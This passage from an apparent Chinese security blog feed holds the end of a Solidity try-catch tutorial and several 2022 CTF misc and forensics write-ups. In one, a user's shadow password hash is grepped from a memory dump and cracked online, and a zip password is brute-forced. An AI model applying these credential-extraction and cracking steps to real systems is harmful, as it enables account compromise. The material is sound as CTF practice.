class="code"><pre><span class="line">function callWithSignature() external returns(bool, bytes memory)&#123;</span><br><span class="line">    (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, &quot;0x2c44b726ADF1963cA47Af88B284C06f30380fC78&quot;));</span><br><span class="line">    return(success, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在日志中，我们可以看到<code>mint</code>函数被成功调用，并输出<code>Log</code>事件。</p><h2 id="Try-Catch"><a href="#Try-Catch" class="headerlink" title="Try Catch"></a>Try Catch</h2><p><code>try-catch</code>是现代编程语言几乎都有的处理异常的一种标准方式，<code>solidity</code>0.6版本也添加了它。这一讲，我们将介绍如何利用<code>try-catch</code>处理智能合约中的异常。</p><h3 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a><code>try-catch</code></h3><p>在<code>solidity</code>中，<code>try-catch</code>只能被用于<code>external</code>函数或创建合约时<code>constructor</code>（被视为<code>external</code>函数）的调用。基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try externalContract.f() &#123;</span><br><span class="line">    // call成功的情况下 运行一些代码</span><br><span class="line">&#125; catch &#123;</span><br><span class="line">    // call失败的情况下 运行一些代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>externalContract.f()</code>是某个外部合约的函数调用，<code>try</code>模块在调用成功的情况下运行，而<code>catch</code>模块则在调用失败时运行。</p><p>同样可以使用<code>this.f()</code>来替代<code>externalContract.f()</code>，<code>this.f()</code>也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。</p><p>如果调用的函数有返回值，那么必须在<code>try</code>之后声明<code>returns(returnType val)</code>，并且在<code>try</code>模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try externalContract.f() returns(returnType val)&#123;</span><br><span class="line">    // call成功的情况下 运行一些代码</span><br><span class="line">&#125; catch &#123;</span><br><span class="line">    // call失败的情况下 运行一些代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，<code>catch</code>模块支持捕获特殊的异常原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try externalContract.f() returns(returnType)&#123;</span><br><span class="line">    // call成功的情况下 运行一些代码</span><br><span class="line">&#125; catch Error(string memory reason) &#123;</span><br><span class="line">    // 捕获失败的 revert() 和 require()</span><br><span class="line">&#125; catch (bytes memory reason) &#123;</span><br><span class="line">    // 捕获失败的 assert()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="try-catch实战"><a href="#try-catch实战" class="headerlink" title="try-catch实战"></a><code>try-catch</code>实战</h3><h4 id="OnlyEven"><a href="#OnlyEven" class="headerlink" title="OnlyEven"></a><code>OnlyEven</code></h4><p>我们创建一个外部合约<code>OnlyEven</code>，并使用<code>try-catch</code>来处理异常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract OnlyEven&#123;</span><br><span class="line">    constructor(uint a)&#123;</span><br><span class="line">        require(a != 0, &quot;invalid number&quot;);</span><br><span class="line">        assert(a != 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onlyEven(uint256 b) external pure returns(bool success)&#123;</span><br><span class="line">        // 输入奇数时revert</span><br><span class="line">        require(b % 2 == 0, &quot;Ups! Reverting&quot;);</span><br><span class="line">        success = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>OnlyEven</code>合约包含一个构造函数和一个<code>onlyEven</code>函数。</p><ul><li>构造函数有一个参数<code>a</code>，当<code>a=0</code>时，<code>require</code>会抛出异常；当<code>a=1</code>时，<code>assert</code>会抛出异常；其他情况均正常。</li><li><code>onlyEven</code>函数有一个参数<code>b</code>，当<code>b</code>为奇数时，<code>require</code>会抛出异常。</li></ul><h4 id="处理外部函数调用异常"><a href="#处理外部函数调用异常" class="headerlink" title="处理外部函数调用异常"></a>处理外部函数调用异常</h4><p>首先，在<code>TryCatch</code>合约中定义一些事件和状态变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 成功event</span><br><span class="line">event SuccessEvent();</span><br><span class="line"></span><br><span class="line">// 失败event</span><br><span class="line">event CatchEvent(string message);</span><br><span class="line">event CatchByte(bytes data);</span><br><span class="line"></span><br><span class="line">// 声明OnlyEven合约变量</span><br><span class="line">OnlyEven even;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">    even = new OnlyEven(2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SuccessEvent</code>是调用成功会释放的事件，而<code>CatchEvent</code>和<code>CatchByte</code>是抛出异常时会释放的事件，分别对应<code>require/revert</code>和<code>assert</code>异常的情况。<code>even</code>是个<code>OnlyEven</code>合约类型的状态变量。</p><p>然后我们在<code>execute</code>函数中使用<code>try-catch</code>处理调用外部函数<code>onlyEven</code>中的异常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 在external call中使用try-catch</span><br><span class="line">function execute(uint amount) external returns (bool success) &#123;</span><br><span class="line">    try even.onlyEven(amount) returns(bool _success)&#123;</span><br><span class="line">        // call成功的情况下</span><br><span class="line">        emit SuccessEvent();</span><br><span class="line">        return _success;</span><br><span class="line">    &#125; catch Error(string memory reason)&#123;</span><br><span class="line">        // call不成功的情况下</span><br><span class="line">        emit CatchEvent(reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="处理合约创建异常"><a href="#处理合约创建异常" class="headerlink" title="处理合约创建异常"></a>处理合约创建异常</h3><p>这里，我们利用<code>try-catch</code>来处理合约创建时的异常。只需要把<code>try</code>模块改写为<code>OnlyEven</code>合约的创建就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 在创建新合约中使用try-catch （合约创建被视为external call）</span><br><span class="line">// executeNew(0)会失败并释放`CatchEvent`</span><br><span class="line">// executeNew(1)会失败并释放`CatchByte`</span><br><span class="line">// executeNew(2)会成功并释放`SuccessEvent`</span><br><span class="line">function executeNew(uint a) external returns (bool success) &#123;</span><br><span class="line">    try new OnlyEven(a) returns(OnlyEven _even)&#123;</span><br><span class="line">        // call成功的情况下</span><br><span class="line">        emit SuccessEvent();</span><br><span class="line">        success = _even.onlyEven(a);</span><br><span class="line">    &#125; catch Error(string memory reason) &#123;</span><br><span class="line">        // catch失败的 revert() 和 require()</span><br><span class="line">        emit CatchEvent(reason);</span><br><span class="line">    &#125; catch (bytes memory reason) &#123;</span><br><span class="line">        // catch失败的 assert()</span><br><span class="line">        emit CatchByte(reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>介绍了如何在<code>solidity</code>使用<code>try-catch</code>来处理智能合约运行中的异常：</p><ul><li>只能用于外部合约调用和合约创建。</li><li>如果<code>try</code>执行成功，返回变量必须声明，并且与返回的变量类型相同。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract OnlyEven&#123;</span><br><span class="line">    constructor(uint a)&#123;</span><br><span class="line">        require(a != 0, &quot;invalid number&quot;);</span><br><span class="line">        assert(a != 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onlyEven(uint256 b) external pure returns(bool success)&#123;</span><br><span class="line">        // 输入奇数时revert</span><br><span class="line">        require(b % 2 == 0, &quot;Ups! Reverting&quot;);</span><br><span class="line">        success = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TryCatch &#123;</span><br><span class="line">    // 成功event</span><br><span class="line">    event SuccessEvent();</span><br><span class="line">    // 失败event</span><br><span class="line">    event CatchEvent(string message);</span><br><span class="line">    event CatchByte(bytes data);</span><br><span class="line"></span><br><span class="line">    // 声明OnlyEven合约变量</span><br><span class="line">    OnlyEven even;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        even = new OnlyEven(2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 在external call中使用try-catch</span><br><span class="line">    // execute(0)会成功并释放`SuccessEvent`</span><br><span class="line">    // execute(1)会失败并释放`CatchEvent`</span><br><span class="line">    function execute(uint amount) external returns (bool success) &#123;</span><br><span class="line">        try even.onlyEven(amount) returns(bool _success)&#123;</span><br><span class="line">            // call成功的情况下</span><br><span class="line">            emit SuccessEvent();</span><br><span class="line">            return _success;</span><br><span class="line">        &#125; catch Error(string memory reason)&#123;</span><br><span class="line">            // call不成功的情况下</span><br><span class="line">            emit CatchEvent(reason);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 在创建新合约中使用try-catch （合约创建被视为external call）</span><br><span class="line">    // executeNew(0)会失败并释放`CatchEvent`</span><br><span class="line">    // executeNew(1)会失败并释放`CatchByte`</span><br><span class="line">    // executeNew(2)会成功并释放`SuccessEvent`</span><br><span class="line">    function executeNew(uint a) external returns (bool success) &#123;</span><br><span class="line">        try new OnlyEven(a) returns(OnlyEven _even)&#123;</span><br><span class="line">            // call成功的情况下</span><br><span class="line">            emit SuccessEvent();</span><br><span class="line">            success = _even.onlyEven(a);</span><br><span class="line">        &#125; catch Error(string memory reason) &#123;</span><br><span class="line">            // catch revert(&quot;reasonString&quot;) 和 require(false, &quot;reasonString&quot;)</span><br><span class="line">            emit CatchEvent(reason);</span><br><span class="line">        &#125; catch (bytes memory reason) &#123;</span><br><span class="line">            // catch失败的assert assert失败的错误类型是Panic(uint256) 不是Error(string)类型 故会进入该分支</span><br><span class="line">            emit CatchByte(reason);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年10月比赛writeups</title>
      <link href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/"/>
      <url>/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年10月比赛writeups"><a href="#2022年10月比赛writeups" class="headerlink" title="2022年10月比赛writeups"></a>2022年10月比赛writeups</h1><h2 id="2022祥云杯"><a href="#2022祥云杯" class="headerlink" title="2022祥云杯"></a>2022祥云杯</h2><p><a href="/image/media/2022/ctf/2022.10/10%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E7%A5%A5%E4%BA%91misc.zip">2022祥云杯misc</a></p><h3 id="0o0o0"><a href="#0o0o0" class="headerlink" title="0o0o0"></a>0o0o0</h3><p>binwalk得到一个zip，得到一个伪加密的zip，解压得到里面的python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from secret import o0o0o0_formula</span><br><span class="line"></span><br><span class="line">o0000o0000 = np.float32(cv2.imread(&#x27;0000.bmp&#x27;, 0))</span><br><span class="line">o0000o0000o = np.float32(cv2.imread(&#x27;oooo.bmp&#x27;, 0))</span><br><span class="line">o0o0o0o0o0 = o0000o0000</span><br><span class="line"></span><br><span class="line">for i in range(o0000o0000.shape[0]//8):  # 0-64</span><br><span class="line">for j in range(o0000o0000.shape[1]//8):  # 0-64</span><br><span class="line">o0oo000oo0 = int(o0000o0000.shape[0] / 8)</span><br><span class="line">o000000000 = int(o0000o0000.shape[1] / 8)</span><br><span class="line">o0000000000 = o0000o0000o.shape[0] * o0000o0000o.shape[1]</span><br><span class="line">o0ooooooo0 = math.ceil(o0000000000 / (o0oo000oo0 * o000000000))</span><br><span class="line">o00o0o0o00 = cv2.dct(o0000o0000[8*i:8*i+8, 8*j:8*j+8])</span><br><span class="line">for ooooooooo in range(o0ooooooo0):</span><br><span class="line">x, y = o0ooooooo0-ooooooooo, o0ooooooo0+ooooooooo</span><br><span class="line">o000ooo000 = o00o0o0o00[x, y]</span><br><span class="line">o0o0o0o0o0o = o00o0o0o00[8 - x, 8 - y]</span><br><span class="line">oo0o0 = secret([i, ooooooooo, random.randint(0, 10)])</span><br><span class="line">oo000 = secret([j, ooooooooo, random.randint(0, 10)])</span><br><span class="line">if o000ooo000 &lt;= o0o0o0o0o0o:</span><br><span class="line">o0oo000oo0oo = random.randint(24, 36)</span><br><span class="line">else:</span><br><span class="line">o0oo000oo0oo = random.randint(-24, -12)</span><br><span class="line">o00o0o0o00[8-x, 8-y] = float(o0oo000oo0oo)</span><br><span class="line">o00o0o0o00[x, y] += float((o0000o0000o[oo0o0][oo000] - 128)*2)</span><br><span class="line">o0o0o0o0o0[8*i:8*i+8, 8*j:8*j+8] = cv2.idct(o00o0o0o00)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(&quot;0o0o0.bmp&quot;, o0o0o0o0o0)</span><br></pre></td></tr></table></figure><p>分析代码可以大致上发现是一个对dct解密的脚本，并且难点是在于如何还原出secret出的值，可以找一下DCT的相关论文</p><p>通过第三个for循环可以大概上判断o0ooooooo0的值为4，把128的内容写入512内，之后进行8×8的分块，然后每个块需要4像素才可以全部隐藏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oo0o0 = secret([i, ooooooooo, random.randint(0, 10)])</span><br><span class="line">oo000 = secret([j, ooooooooo, random.randint(0, 10)])</span><br></pre></td></tr></table></figure><p>上面的关系大概为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oo0o0 = 2*i+ooooooooo*2</span><br><span class="line">oo000 = j*2+ooooooooo//2</span><br></pre></td></tr></table></figure><p>然后得到脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">know_png = np.float32(cv2.imread(&#x27;0o0o0.bmp&#x27;, 0))</span><br><span class="line">png_0 = know_png</span><br><span class="line"># print(know_png[0])</span><br><span class="line">flag = np.ones(shape=(128, 128), dtype=int)  # 定义的128*128的数组</span><br><span class="line"># o0000000000 = o0o.shape[0] * o0o.shape[1]  # 262144</span><br><span class="line"># o0oo000oo0 = int(o0o.shape[0] / 8)  # 64</span><br><span class="line"># o000000000 = int(o0o.shape[1] / 8)  # 64</span><br><span class="line"># o0ooooooo0 = math.ceil(o0000000000 / (o0oo000oo0 * o000000000))  # 64</span><br><span class="line"># print(&quot;***********************部分初始值***************************&quot;)</span><br><span class="line"># print(o0o)  # 已知图片矩阵</span><br><span class="line"># print(o0o.shape[0] // 8)  # 长，宽</span><br><span class="line"># print(o0o.shape[1] / 8)  # 已知图片矩阵</span><br><span class="line"># print(o0o.shape[1])  # 已知图片矩阵</span><br><span class="line"># print(len(o0o))  # 512</span><br><span class="line"># print(len(o0o[0]))  # 512</span><br><span class="line"># print(o0000000000)  # 262144</span><br><span class="line"># print(o0oo000oo0)  # 64</span><br><span class="line"># print(o0oo000oo0)  # 64</span><br><span class="line"># print(o0ooooooo0)  # 64</span><br><span class="line"># print(math.ceil(o0000000000 / (o0oo000oo0 * o000000000))) #可能是4</span><br><span class="line">res = []</span><br><span class="line">water = Image.new(&#x27;L&#x27;, (128, 128), 255)</span><br><span class="line"># for i in range(63, 62, -1):</span><br><span class="line">#     for j in range(63, 62, -1):</span><br><span class="line">for i in range(64):</span><br><span class="line">    for j in range(64):</span><br><span class="line">        a = know_png[8 * i:8 * i + 8, 8 * j:8 * j + 8]</span><br><span class="line">        # print(&quot;已知图片的矩阵:\n&quot;, a)  # 一个8*8的二位数组</span><br><span class="line">        # print(a)</span><br><span class="line">        b = cv2.dct(a)</span><br><span class="line">        # print(b)</span><br><span class="line">        # c=cv2.idct(b)</span><br><span class="line">        # print(c)</span><br><span class="line">        # dct_encode = cv2.dct(png_1[8 * i:8 * i + 8, 8 * j:8 * j + 8])</span><br><span class="line">        # print(&quot;离散运算后的矩阵:\n&quot;, b)</span><br><span class="line">        for k in range(4):</span><br><span class="line">            x, y = 4 - k, 4 + k</span><br><span class="line">            r1 = b[x, y]</span><br><span class="line">            r2 = b[7 - x, 7 - y]</span><br><span class="line">            if r1 &gt; r2:</span><br><span class="line">                water.putpixel((i * 2 + k % 2, j * 2 + k // 2), 0)</span><br><span class="line">                res.append(0)</span><br><span class="line">            else:</span><br><span class="line">                water.putpixel((i * 2 + k % 2, j * 2 + k // 2), 255)</span><br><span class="line">                res.append(1)</span><br><span class="line">print(res)</span><br><span class="line">water.show()</span><br><span class="line">water.save(&quot;1.png&quot;)</span><br></pre></td></tr></table></figure><p>得到图片</p><p><img src="/image/media/2022/ctf/2022.10/img/1.png"></p><p>然后根据图片上的像素点可以猜测是需要xor一次，xor 0xff</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im = Image.open(&quot;1.png&quot;)</span><br><span class="line">im = im.convert(&quot;L&quot;)</span><br><span class="line">w,h = im.size</span><br><span class="line">flag = []</span><br><span class="line">k = 0</span><br><span class="line">for j in range(w):</span><br><span class="line">    for i in range(h):</span><br><span class="line">        if im.getpixel((j,i)) != 255:</span><br><span class="line">            k += 1</span><br><span class="line">        else:</span><br><span class="line">            flag.append(k)</span><br><span class="line">            k = 1</span><br><span class="line">print(flag)</span><br><span class="line">for i in flag:</span><br><span class="line">  print(chr(i^0xff),end=&quot;&quot;)</span><br><span class="line">  </span><br><span class="line">#[0, 153, 147, 158, 152, 132, 153, 205, 200, 199, 156, 199, 202, 202, 210, 200, 203, 198, 207, 210, 203, 200, 199, 154, 210, 157, 203, 202, 157, 210, 198, 201, 205, 205, 155, 200, 153, 198, 157, 198, 199, 207, 130]</span><br><span class="line">#ÿflag&#123;f278c855-7490-478e-b45b-9622d7f9b980&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f278c855-7490-478e-b45b-9622d7f9b980&#125;</span><br></pre></td></tr></table></figure><h3 id="strange-forensics"><a href="#strange-forensics" class="headerlink" title="strange_forensics"></a>strange_forensics</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小赵的内存被dump下来了，你能找到flag嘛？flag分为三段，flag1为用户密码，flag3以.为结束符（.不算在flag里），找到三个flag后依次拼在一起，用flag&#123;&#125;包上提交，https://pan.baidu.com/share/init?surl=GxRSIsu3v25K08eylOQcxA提取码（GAME）</span><br></pre></td></tr></table></figure><p>附件下载是Linux镜像，flag分三步，直接strings可以查看内容，首先找到flag3：Ux_forEnsIcs_MASTER</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 1.mem |grep flag3 </span><br><span class="line"># root@ubuntu:/home/bob/Desktop/lime# flag3 is Ux_forEnsIcs_MASTER</span><br></pre></td></tr></table></figure><p>然后通过查找用户可以看到bob用户带密码，找到flag1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 1.mem |grep bob:            </span><br><span class="line"># bob:$1$C5/bIl1n$9l5plqPKK4DjjqpGHz46Y/:19283:0:99999:7:::</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.somd5.com/%E8%A7%A3%E5%AF%86%E5%AF%86%E7%A0%81%E5%BE%97%E5%88%B0flag1%EF%BC%9A890topico">https://www.somd5.com/解密密码得到flag1：890topico</a></p><p><img src="/image/media/2022/ctf/2022.10/img/2.png"></p><p>最后使用strings在桌面上找到一个zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 1.mem |grep Desktop |grep zip</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/ctf/2022.10/img/3.png"></p><p>把加密位从00改成09，把伪加密改成真加密，爆破密码得到flag2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2 is _y0u_Ar3_tHe_LIn</span><br></pre></td></tr></table></figure><p>三个flag拼接得到完整的flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;890topico_y0u_Ar3_tHe_LInUx_forEnsIcs_MASTER&#125;</span><br></pre></td></tr></table></figure><h3 id="misc未解的"><a href="#misc未解的" class="headerlink" title="misc未解的"></a>misc未解的</h3><p>参考文章雪佬<br><a href="http://www.snowywar.top/?p=4077">http://www.snowywar.top/?p=4077</a></p><h2 id="工控"><a href="#工控" class="headerlink" title="工控"></a>工控</h2><p><a href="/image/media/2022/ctf/2022.10/10%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%B1%9F%E8%8B%8F%E7%9C%81%E9%80%89%E6%8B%94%E8%B5%9B.zip">中国工业互联网安全大赛江苏省选拔赛</a></p><p>大部分都是简单题目，记录一下脚本和大致上的思路</p><h3 id="EasyStego"><a href="#EasyStego" class="headerlink" title="EasyStego"></a>EasyStego</h3><p>Foremost分离得到pdf，全选发现隐藏字符串</p><p>Rot47解密之后得到flag</p><h3 id="modbus"><a href="#modbus" class="headerlink" title="modbus"></a>modbus</h3><p>查看流量看到modbus.data段有数据，使用tshark提取出来，可以看到是8950开头，判断是png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1667351190249.pcapng -Y &quot;modbus.data&quot; -T fields -e modbus.data &gt;1.txt</span><br></pre></td></tr></table></figure><p>提取脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;1.txt&quot;, &#x27;r&#x27;) as f:</span><br><span class="line">    lines=f.readlines()</span><br><span class="line">b=&#x27;&#x27;</span><br><span class="line">for i in  range(1,len(lines),2) :</span><br><span class="line"></span><br><span class="line">    b+=lines[i][2:4]</span><br><span class="line">    i+=1</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p>输出的数据信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 